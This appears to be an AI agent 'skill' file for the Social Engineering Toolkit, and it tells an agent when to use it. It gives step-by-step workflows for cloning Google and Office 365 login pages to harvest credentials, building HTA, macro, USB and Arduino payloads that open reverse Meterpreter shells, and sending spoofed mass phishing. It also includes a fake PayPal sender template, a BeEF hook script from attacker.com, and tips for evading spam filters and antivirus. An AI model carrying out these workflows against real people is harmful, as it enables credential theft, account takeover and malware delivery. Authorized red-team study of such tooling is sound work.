---
name: set-toolkit
description: >
  Build, extend, and operate the Social Engineering Toolkit (SET) — a framework
  for simulating human-vector attacks during authorized red team and pentesting
  engagements. Use when the user asks about SET, social engineering attack vectors,
  credential harvesting, phishing simulation, HTA attacks, PowerShell injection,
  Arduino HID attacks, or Metasploit-integrated client-side exploits. Covers
  setoolkit menu navigation, all major attack vectors, website cloning, custom
  phishing templates, Java applet attacks, mass mailer campaigns, and engagement
  methodology for authorized simulations.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/trustedsec/social-engineer-toolkit
---

# set-toolkit Agent Skill

## When to Use This Skill

Use this skill when:
- The user is conducting an authorized phishing or social engineering simulation
- Working with SET menu navigation, attack vector configuration, or credential harvesting
- The user needs to clone websites, craft phishing templates, or inject payloads
- The user asks about Java applet attacks, HTA attacks, PowerShell injection, or Arduino HID
- Integrating SET with Metasploit for client-side exploitation
- Building or customizing SET phishing templates and mass mailer campaigns

## What SET Does

SET (Social Engineering Toolkit), maintained by TrustedSec, is the industry-standard
framework for simulating human-focused attack vectors during authorized penetration tests.
It provides an interactive menu-driven interface over dozens of attack modules — from
credential-harvesting website clones and malicious HTA files to Arduino-based HID attacks
and mass spear-phishing campaigns. SET integrates natively with Metasploit for payload
generation and handler management.

## Installation

```bash
# Kali Linux (pre-installed, update with)
sudo apt update && sudo apt install set -y

# From source (Python 3)
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements.txt
sudo python3 setup.py

# Run
sudo setoolkit
```

SET requires root (for raw socket operations, port 80/443 binding). The config file lives at
`/etc/setoolkit/set.config` (or `~/.set/set.config` in source installs).

## Core Concepts

### set.config Key Settings

```ini
METASPLOIT_PATH=/usr/share/metasploit-framework  # Path to msf
AUTO_DETECT=ON            # Auto-detect IP for listeners
APACHE_SERVER=OFF         # Use Apache vs SET's built-in web server
SENDMAIL=OFF              # Use sendmail for mass mailer
WEBATTACK_EMAIL=ON        # Email after credential capture
HARVEST_EMAIL_NOTIFICATION=user@domain.com
```

### Menu Structure

```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit
5) Update SET configuration
6) Help, Credits, and About
```

## Attack Vectors

### 1. Spear-Phishing Attack Vector (Menu 1 → 1)

```
1) Perform a Mass Email Attack
2) Create a FileFormat Payload
3) Create a Social-Engineering Template
```

**FileFormat payload workflow:**
```
SET Menu → 1 → 1 → 2 → [choose format: PDF, DOCX, XLSX, etc.]
→ [choose payload: Meterpreter Reverse TCP, etc.]
→ LHOST: 10.10.14.5
→ LPORT: 4444
→ SET automatically generates the malicious file + Metasploit listener
```

**Custom template creation:**
```
SET Menu → 1 → 1 → 3
→ Enter template name
→ Subject line
→ Email body (HTML supported)
→ Templates saved to: /usr/share/set/src/phishing/templates/
```

### 2. Website Attack Vectors (Menu 1 → 2)

```
1) The Java Applet Attack Method
2) The Metasploit Browser Exploit Method
3) Credential Harvester Attack Method
4) Tabnabbing Attack Method
5) Web Jacking Attack Method
6) Multi-Attack Web Method
7) HTA Attack Method
```

#### Credential Harvester (Menu 1 → 2 → 3)

The most reliable modern attack. Clones a legitimate site and captures POST data.

```
SET Menu → 1 → 2 → 3
→ 1) Web Templates (built-in: Gmail, Facebook, Twitter, etc.)
  OR
→ 2) Site Cloner
  → URL to clone: https://accounts.google.com
  → POST back IP: 10.10.14.5
  → SET starts listener on :80
```

Behind the scenes, SET rewrites form `action=` attributes to POST to `http://ATTACKER_IP/post.php`.
Harvested credentials appear in `/tmp/harvester_TIMESTAMP.txt` and in the terminal.

#### Java Applet Attack (Menu 1 → 2 → 1)

Delivers a signed (self-signed) Java applet that prompts for execution. Effectiveness depends on
Java version and browser. Works best with older JRE (< 7u51).

```
SET Menu → 1 → 2 → 1
→ Site Cloner → URL to clone
→ Choose Meterpreter payload
→ LHOST / LPORT
→ Applet name (displayed in Java prompt): "Flash Player Update"
→ SET generates applet, signs it, starts listener
```

#### HTA Attack (Menu 1 → 2 → 7)

HTML Application attack — sends a `.hta` file that executes VBScript/PowerShell on open.
Bypasses many AV products and runs with user privileges.

```
SET Menu → 1 → 2 → 7
→ 1) PowerShell Injection
→ LHOST / LPORT
→ SET creates malicious.hta + Metasploit handler
→ Host file at: http://10.10.14.5/malicious.hta
→ Deliver URL via phishing email
```

HTA content is generated in `/tmp/msf.hta`. The PowerShell injection typically base64-encodes
a reverse shell payload to evade basic filters.

### 3. Infectious Media Generator (Menu 1 → 3)

Creates an autorun USB payload:

```
SET Menu → 1 → 3
→ 1) File-Format Exploits
→ 2) Standard Metasploit Executable
→ Output written to /tmp/autorun/ (autorun.inf + payload.exe)
→ Copy to USB root
```

Modern Windows disables Autorun by default; effectiveness relies on social engineering
(convincing the target to click the executable).

### 4. Mass Mailer Attack (Menu 1 → 5)

```
SET Menu → 1 → 5
→ 1) Email Attack Single Email Address
→ 2) Email Attack Mass Mailer
→ Send via: Gmail (SMTP) or Sendmail
→ GMAIL: enter credentials (use app password for 2FA accounts)
→ From name: "IT Support Team"
→ From email: it-support@companydomain.com (spoofed)
→ Subject + body (HTML)
→ Attachment: auto-attaches previously generated payload
```

For bulk campaigns, provide a newline-delimited target list file when prompted.
SET iterates through each address with configurable delay.

### 5. Arduino HID Attack (Menu 1 → 6)

Generates an Arduino sketch that acts as a HID keyboard to execute a payload on plug-in.

```
SET Menu → 1 → 6
→ 1) Powershell HTTP GET MSF Payload
→ 2) WSCRIPT HTTP GET MSF Payload
→ LHOST / LPORT
→ Output: /tmp/arduino_sketch.ino
→ Flash to Arduino Uno/Leonardo (must have HID capability)
→ Target plug-in triggers PowerShell download + execute
```

### 6. QRCode Attack (Menu 1 → 9)

```
SET Menu → 1 → 9
→ Enter URL (typically credential harvester URL)
→ QR code saved to /tmp/qrcode.png
→ Embed in phishing emails, printed materials, or badges
```

### 7. PowerShell Attack Vectors (Menu 1 → 10)

```
1) PowerShell Alphanumeric Shellcode Injector
2) PowerShell Reverse Shell
3) PowerShell Bind Shell
4) PowerShell Dump SAM Database

SET Menu → 1 → 10 → 1
→ LHOST / LPORT
→ Generates: /tmp/x86_powershell_injection.txt
→ Deliver one-liner via HTA, macro, LNK, or direct access
```

## Metasploit Integration

SET auto-launches Metasploit listeners when generating payloads. To manage manually:

```bash
# After SET generates payload, use existing handler in msfconsole
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
run -j

# Session upgrades
sessions -u 1          # Upgrade shell to meterpreter
sessions -i 1          # Interact with session
```

SET's `set.config` controls whether it auto-launches msf or prints the rc file.

## Custom Phishing Templates

Templates live in `/usr/share/set/src/phishing/templates/`. Each is a directory containing:

```
templatename/
├── template.html     # Email body (HTML)
└── config.ini        # Subject, from name, from address defaults
```

**config.ini format:**
```ini
[EMAIL]
SUBJECT=Your account requires verification
FROM=security@paypal.com
FROM_NAME=PayPal Security Team
```

To add a custom template, create the directory structure and it appears in the Mass Mailer menu.

## Common Engagement Workflows

### Credential Harvesting Campaign

```bash
# 1. Start credential harvester
sudo setoolkit
# → 1 → 2 → 3 → 2 (Site Cloner)
# → URL: https://outlook.office365.com
# → IP: 10.10.14.5 (VPN/redirector IP)

# 2. Note the harvester URL, shorten with Burp Collaborator or a redirect domain
# 3. Deliver URL via spear-phishing email (use Mass Mailer or external MTA)
# 4. Monitor terminal for captured credentials
# 5. Credentials logged to /tmp/harvester_*.txt
```

### Phishing with Payload Delivery

```bash
# 1. Generate DOCX with macro payload
SET → 1 → 1 → 2 → DOCX (MS Word 97-2003 .doc)
# Choose: Meterpreter Reverse HTTPS
# LHOST: your redirector/C2 IP
# LPORT: 443

# 2. SET starts listener or provides RC file
# 3. Wrap in spear-phish with urgency lure
# 4. On open → macro execution → reverse meterpreter
# 5. post/windows/manage/migrate into stable process
```

### HTA Drive-By via Phishing

```bash
# 1. Create HTA payload
SET → 1 → 2 → 7 → PowerShell HTTP GET
# LHOST/LPORT set to your listener

# 2. Host on Apache (edit set.config APACHE_SERVER=ON)
# 3. Link in email: "Click here to view the document: http://attacker.com/update.hta"
# 4. On click → HTA opens → PowerShell executes → shell
```

## Advanced Techniques

### Apache + SET for Better Reliability

```bash
# Enable Apache in set.config
sudo nano /etc/setoolkit/set.config
# Set APACHE_SERVER=ON
# SET will copy web attack files to /var/www/html/ instead of using its built-in server
sudo systemctl start apache2
```

### Redirectors and Domain Fronting

Use a separate redirector (nginx, Cloudflare Worker) in front of SET to avoid direct IP
exposure in phishing links. Configure APACHE_SERVER=ON, then set nginx to proxy_pass
to localhost.

### Capturing Credentials with Email Notification

```ini
# set.config
WEBATTACK_EMAIL=ON
HARVEST_EMAIL_NOTIFICATION=operator@yourdomain.com
WEBATTACK_GMAIL_USERNAME=sender@gmail.com
WEBATTACK_GMAIL_PASSWORD=apppassword
```

### Combining with BeEF (Browser Exploitation Framework)

```bash
# Start BeEF, note hook URL
# In SET Site Cloner, inject BeEF hook into cloned page body:
# Edit /var/www/html/index.html post-clone to add:
# <script src="http://attacker.com:3000/hook.js"></script>
# Victims loading the clone get both credential harvested AND hooked in BeEF
```

## Integration with Other Tools

| Tool | Use Case |
|------|----------|
| Metasploit | Payload generation, listener management, post-exploitation |
| BeEF | Browser hook injection on cloned pages |
| GoPhish | More scalable phishing campaigns (use SET for payload gen) |
| Evilginx2 | Proxy-based credential/session token capture (more reliable than SET harvester for MFA bypass) |
| ngrok / Cloudflare Tunnel | Expose SET listener via HTTPS without a VPS |

## Troubleshooting

**Port 80/443 already in use:**
```bash
sudo fuser -k 80/tcp 443/tcp
# Or switch to Apache: APACHE_SERVER=ON in set.config
```

**Metasploit not found:**
```bash
# Update METASPLOIT_PATH in set.config
which msfconsole   # Find actual path
sudo nano /etc/setoolkit/set.config
# METASPLOIT_PATH=/path/to/metasploit-framework
```

**Cloned site not displaying correctly:**
- Check for HSTS headers (browser may refuse HTTP version of HTTPS-only sites)
- Use Evilginx2 or Modlishka for proxy-based harvesting instead
- Manually fix asset paths in `/var/www/html/index.html`

**Java applet not executing:**
- Modern browsers block NPAPI (Java applet) plugins entirely
- Use HTA, macro, or LNK payloads instead for current targets

**Emails landing in spam:**
- Set up SPF/DKIM/DMARC on your sending domain
- Use a legitimate SMTP relay with sending reputation
- Avoid obvious spam keywords in subject/body
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
